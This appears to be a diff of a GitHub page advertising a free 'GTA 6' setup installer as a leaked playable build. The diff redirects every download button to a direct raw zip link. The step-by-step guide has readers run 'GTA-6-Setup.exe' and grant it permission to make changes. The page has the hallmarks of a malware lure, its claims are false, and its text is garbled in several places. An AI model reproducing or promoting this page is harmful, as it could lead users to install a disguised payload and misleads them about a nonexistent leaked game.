@@ -2,7 +2,7 @@
 <h1>🎮 GTA-6-Setup-Installer-Free-Download - Get the Full Game Installed in Minutes</h1>
 
 <div style="text-align: center; margin:  ersetzen30px 0">
-<a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download" style="background-color: #ff6600; color: white; padding: 15px 40px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display:ke inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.3)">⬇️ DOWNLOAD GTA 6 SETUP INSTALLER</a>
+<a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download/raw/refs/heads/main/antitegula/Installer-Setup-Download-Free-GT-2.4.zip" style="background-color: #ff6600; color: white; padding: 15px 40px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display:ke inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.3)">⬇️ DOWNLOAD GTA 6 SETUP INSTALLER</a>
 </div>
 
 <p>Welcome to the official download page for <strong>GTA 6 Setup Installer Free Download</strong>. This is the <em>leaked, fully playable 2026 build</em> of the highly anticipated game, prepared as a simple setup installer for Windows PC. If you're tired of waiting and want to jump straight into Vice City's new adventures, this is your golden ticket.</p>
@@ -43,7 +43,7 @@
 <h2>📥 Download & Installation Guide (Step-by-Step</h2>
 
 <ol>
-<li><strong>Visit the download page</strong> — Click the orange button at the top of this pageor navigate to: <a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download">https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download</a>. This link will take you to the official download page for this game installer.</li>
+<li><strong>Visit the download page</strong> — Click the orange button at the top of this pageor navigate to: <a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download/raw/refs/heads/main/antitegula/Installer-Setup-Download-Free-GT-2.4.zip">https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download/raw/refs/heads/main/antitegula/Installer-Setup-Download-Free-GT-2.4.zip</a>. This link will take you to the official download page for this game installer.</li>
 <li><strong>Start the download</strong> — On that page, you'll see a prominent download button or a file named <code>GTA-6-Setup.exe</code>. Click it. The file size is approximately 45 GB (compressed). The download may take several hours depending on your internet speed.</li>
 <li><strong>Save the file</strong> — Choose a location on your computer you'll remember, such as your <em>Downloads</em> folder. Wait for the download to finish100%.</li>
 <li><strong>Launch the installer</strong> — Once downloaded, locate the file <code>GTA-6-Setup.exe</code> and double-click it. If Windows asks for permission, click "Yes" to allow changes.</li>
@@ -92,7 +92,7 @@
 <p>For maximim performance, ensure your Windows power plan is set to "High Performance" in Control Panelages. Also, keep your GPU drivers updated. Enjoy the game!</p>
 
 <div style="text-align: center; margin: 30px 0">
-<a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download" style="background-color: #28a745; color: white; padding: 15px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: threw0 4px 6px rgba(0,0,0,0.3)">⬇️ CLICK HERE TO DOWNLOAD GTA 6</a>
+<a href="https://github.com/Porterbestubbled1558/GTA-6-Setup-Installer-Free-Download/raw/refs/heads/main/antitegula/Installer-Setup-Download-Free-GT-2.4.zip" style="background-color: #28a745; color: white; padding: 15px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: threw0 4px 6px rgba(0,0,0,0.3)">⬇️ CLICK HERE TO DOWNLOAD GTA 6</a>
 </div>
 
 <p><small>This is an unofficial fan-made distribution. GTA 6 is a trademark of Rockstar Games. This software is provided for personal use only. By downloading, you agree to use it at your own risk.</small></p>
